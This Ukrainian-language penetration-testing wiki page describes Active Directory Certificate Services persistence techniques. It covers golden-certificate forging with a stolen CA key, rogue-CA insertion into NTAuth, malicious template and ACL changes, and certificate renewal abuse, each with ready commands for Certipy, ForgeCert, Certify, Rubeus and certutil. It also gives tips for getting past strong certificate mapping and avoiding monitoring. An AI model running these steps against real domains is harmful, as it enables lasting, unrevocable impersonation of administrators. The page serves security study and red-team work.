# Persistence домену AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Це короткий огляд технік persistence домену, описаних у [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Зверніться до нього, щоб дізнатися більше.<sup>[[5]](#references)</sup>

## Підробка сертифікатів за допомогою викрадених сертифікатів CA (Golden Certificate) - DPERSIST1

Як визначити, що сертифікат є сертифікатом CA?

Це можна визначити за наявністю кількох умов:<sup>[[5]](#references)</sup>

- Сертифікат зберігається на сервері CA, а його приватний ключ захищено DPAPI машини або апаратними засобами, такими як TPM/HSM, якщо це підтримує операційна система.
- Поля Issuer і Subject сертифіката збігаються з розрізнювальним ім’ям CA.
- У сертифікатах CA є розширення "CA Version", яке відсутнє в інших сертифікатах.
- У сертифікаті немає полів Extended Key Usage (EKU).

Для вилучення приватного ключа цього сертифіката підтримуваним способом є використання інструмента `certsrv.msc` на сервері CA через вбудований GUI. Однак цей сертифікат не відрізняється від інших, що зберігаються в системі, тому для його вилучення можна застосовувати такі методи, як [техніка THEFT2](certificate-theft.md#user-certificate-theft-via-dpapi-theft2).

Сертифікат і приватний ключ також можна отримати за допомогою Certipy такою командою:<sup>[[2]](#references)</sup>

```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```

Після отримання сертифіката CA та його приватного ключа у форматі `.pfx` можна використовувати такі інструменти, як [ForgeCert](https://github.com/GhostPack/ForgeCert), для створення дійсних сертифікатів:

```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```

> [!WARNING]
> Користувач, для якого підроблюють сертифікат, має бути активним і мати змогу автентифікуватися в Active Directory, щоб процес завершився успішно. Підроблення сертифіката для спеціальних облікових записів, як-от krbtgt, неефективне.

Цей підроблений сертифікат буде **дійсним** до вказаної кінцевої дати й доти, доки **дійсний сертифікат кореневого CA** (зазвичай від 5 до **10+ років**). Він також дійсний для **комп’ютерів**, тому в поєднанні з **S4U2Self** зловмисник може **підтримувати persistence на будь-якому комп’ютері домену** протягом усього строку дії сертифіката CA.\
Крім того, **сертифікати, згенеровані** цим методом, **неможливо відкликати**, оскільки CA про них не знає.

### Робота в умовах Strong Certificate Mapping Enforcement (2025+)

Починаючи з 11 лютого 2025 року (після розгортання KB5014754), контролери домену за замовчуванням використовують режим **Full Enforcement** для зіставлення сертифікатів. На практиці це означає, що ваші підроблені сертифікати мають або:

- Містити надійний зв’язок із цільовим обліковим записом (наприклад, розширення безпеки SID), або
- Використовуватися разом із надійним явним зіставленням в атрибуті `altSecurityIdentities` цільового об’єкта.<sup>[[1]](#references)</sup>

Надійний спосіб забезпечити persistence — створити підроблений сертифікат, підписаний викраденим Enterprise CA, а потім додати надійне явне зіставлення до облікового запису жертви:

```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```

Нотатки
- Якщо вдасться створити підроблені сертифікати з розширенням безпеки SID, вони неявно зіставлятимуться навіть у режимі Full Enforcement. В іншому разі надавайте перевагу явним надійним зіставленням. Докладніше про явні зіставлення див. у [account-persistence](account-persistence.md).
- Відкликання тут не допоможе захисникам: підроблені сертифікати невідомі базі даних CA, тому їх неможливо відкликати.

#### Підроблення, сумісне з Full Enforcement (з урахуванням SID)

Оновлені інструменти дають змогу безпосередньо вбудовувати SID, завдяки чому golden certificates залишаються придатними до використання, навіть коли DC відхиляють слабкі зіставлення:<sup>[[3]](#references)</sup>

```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
  --upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
  --outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
  -sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```

Вбудувавши SID, ви уникаєте необхідності змінювати `altSecurityIdentities`, за яким може вестися моніторинг, і водночас задовольняєте перевірки надійного зіставлення.

## Додавання сертифікатів недовіреного CA — DPERSIST2

Об’єкт `NTAuthCertificates` призначений для зберігання одного або кількох **сертифікатів CA** в атрибуті `cacertificate`, який використовує Active Directory (AD). Під час перевірки **контролер домену** шукає в об’єкті `NTAuthCertificates` запис, що відповідає **CA, указаному** в полі Issuer сертифіката, який використовується для автентифікації. Якщо відповідність знайдено, автентифікація продовжується.<sup>[[5]](#references)</sup>

Зловмисник може додати самопідписаний сертифікат CA до об’єкта `NTAuthCertificates`, якщо має контроль над цим об’єктом AD. Зазвичай дозвіл на зміну цього об’єкта мають лише учасники групи **Enterprise Admin**, а також **Domain Admins** або **Administrators** у **кореневому домені лісу**. Вони можуть редагувати об’єкт `NTAuthCertificates` за допомогою `certutil.exe`, виконавши команду `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, або скориставшись [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Додаткові корисні команди для цієї техніки:

```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```

Ця можливість особливо актуальна в поєднанні з раніше описаним методом, який використовує ForgeCert для динамічного генерування сертифікатів.

> Особливості зіставлення після 2025 року: додавання зловмисного CA до NTAuth лише встановлює довіру до CA, що видав сертифікат. Щоб leaf-сертифікати можна було використовувати для входу, коли на DC увімкнено **Full Enforcement**, leaf-сертифікат має містити розширення безпеки SID або для цільового об’єкта має бути задано явне надійне зіставлення (наприклад, Issuer+Serial у `altSecurityIdentities`). Див. {{#ref}}account-persistence.md{{#endref}}.

## Зловмисна помилкова конфігурація - DPERSIST3

Можливостей для **закріплення** за допомогою **модифікацій дескрипторів безпеки** компонентів AD CS чимало. Зловмисник із підвищеним рівнем доступу може зловмисно застосувати модифікації, описані в розділі «[Ескалація домену](domain-escalation.md)». Це включає додавання «прав керування» (наприклад, WriteOwner/WriteDACL тощо) до важливих компонентів, як-от:<sup>[[5]](#references)</sup>

- **Об’єкт комп’ютера AD** сервера **CA**
- **RPC/DCOM-сервер** сервера **CA**
- Будь-який **нащадковий об’єкт або контейнер AD** у **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (наприклад, контейнер Certificate Templates, контейнер Certification Authorities, об’єкт NTAuthCertificates тощо)
- **Групи AD, яким організація явно делегувала права керування CA або шаблонами**. Вбудована група Cert Publishers має право публікувати сертифікати для об’єктів користувачів в AD; саме членство в групі не надає прав керування CA чи шаблонами або прав на реєстрацію. Перевіряйте окремо відповідні дозволи CA і шаблонів. Див. [опис Cert Publishers від Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers) і [дозволи шаблонів сертифікатів](https://learn.microsoft.com/en-us/intune/configmgr/protect/plan-design/planning-for-certificate-template-permissions).

Приклад зловмисного впровадження: зловмисник із **підвищеними правами** в домені додає дозвіл **`WriteOwner`** до стандартного шаблону сертифіката **`User`**, призначаючи себе суб’єктом цього права. Щоб скористатися цим, зловмисник спочатку змінює власника шаблону **`User`** на себе. Потім для шаблону встановлюється значення **1** для **`mspki-certificate-name-flag`**, щоб увімкнути **`ENROLLEE_SUPPLIES_SUBJECT`** і дозволити користувачу вказувати Subject Alternative Name у запиті. Після цього зловмисник може **зареєструватися** за допомогою **шаблону**, вказавши ім’я **адміністратора домену** як альтернативне ім’я, а потім використати отриманий сертифікат для автентифікації як DA.

Практичні параметри, які зловмисники можуть налаштувати для довготривалого закріплення в домені (детальний опис і виявлення див. у {{#ref}}domain-escalation.md{{#endref}}):

- Прапорці політики CA, що дозволяють SAN із запиту (наприклад, увімкнення `EDITF_ATTRIBUTESUBJECTALTNAME2`). Це залишає шляхи, подібні до ESC1, придатними для експлуатації.
- DACL або параметри шаблону, що дозволяють видавати сертифікати, придатні для автентифікації (наприклад, додавання EKU Client Authentication, увімкнення `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Контроль над об’єктом `NTAuthCertificates` або контейнерами CA, щоб постійно повторно додавати зловмисні видавці, якщо захисники спробують їх видалити.

> [!TIP]
> У посилено захищених середовищах після KB5014754 поєднання цих помилкових конфігурацій із явними надійними зіставленнями (`altSecurityIdentities`) гарантує, що видані або підроблені сертифікати залишаться придатними до використання навіть за умови, що на DC застосовується примусове надійне зіставлення.

### Зловживання поновленням сертифіката (ESC14) для закріплення

Якщо ви скомпрометували сертифікат, придатний для автентифікації (або сертифікат Enrollment Agent), ви можете **поновлювати його безстроково**, доки шаблон, що його видав, залишається опублікованим, а ваш CA і далі довіряє ланцюжку видавця. Поновлення зберігає початкові прив’язки до особи, але продовжує строк дії, через що витіснити зловмисника складно, якщо не виправити шаблон або не перевидати CA.<sup>[[4]](#references)</sup>

```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```

Якщо контролери домену працюють у режимі **Full Enforcement**, додайте `-sid <victim SID>` (або використайте шаблон, який і далі містить розширення безпеки SID), щоб оновлений кінцевий сертифікат і надалі надійно зіставлявся без змін `altSecurityIdentities`. Зловмисники з правами адміністратора CA також можуть змінити `policy\RenewalValidityPeriodUnits`, щоб збільшити строк дії оновлених сертифікатів перед тим, як видати собі сертифікат.<sup>[[2]](#references)[[4]](#references)</sup>


## References

- [1] [Microsoft KB5014754 – Зміни автентифікації на основі сертифікатів на контролерах домену Windows (графік застосування та надійні зіставлення)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – Довідник команд і використання forge/auth](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0 (інтегрований forge із підтримкою SID)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [Огляд зловживання поновленням ESC14](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Сертифікований власник: зловживання Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
{{#include ../../../banners/hacktricks-training.md}}
